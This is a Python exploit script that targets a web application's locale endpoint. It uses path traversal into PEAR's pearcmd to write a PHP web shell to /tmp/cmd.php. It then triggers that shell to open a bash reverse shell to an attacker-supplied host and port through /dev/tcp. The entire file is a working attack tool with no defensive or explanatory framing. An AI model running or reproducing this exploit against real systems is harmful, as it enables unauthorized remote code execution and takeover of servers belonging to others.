#!/usr/bin/env python3


import argparse
import requests
from pwn import *


proxy = {'http':'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser()
parser.add_argument("-url", help="url", required=True)
parser.add_argument("-lhost", help="lhost", required=True)
parser.add_argument("-lport", help="lport", required=True)
args = parser.parse_args()

def exploit():
    print(f"[+] Uploading Web Shell on {args.url}...")
    
    conn = remote(args.url, 80)
    
    request = f"GET /locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&+config-create+/<?=system($_GET[0])?>+/tmp/cmd.php HTTP/1.1\r\n"
    request += f"Host: {args.url}\r\n"
    request += "Connection: close\r\n\r\n"
    
    conn.send(request.encode())
    response = conn.recvall().decode()
    conn.close()
    
    print("Successfully created default configuration file \"/tmp/cmd.php\"")


def rce():
	url =f"http://{args.url}/locales/locale.json?locale=../../../../../../tmp&namespace=cmd&0=bash+-c+%22bash+-i+%3E%26+/dev/tcp/{args.lhost}/{args.lport}+0%3E%261%22"
	print(f"[+] Sending the RCE to {args.lhost}...")
	r = requests.get(url, proxies=proxy)
	if r.status_code == 500:
		print("[+] RCE exploited :>")
	else:
		print(f"[-] Failed: {r.status_code}")


exploit()
rce()
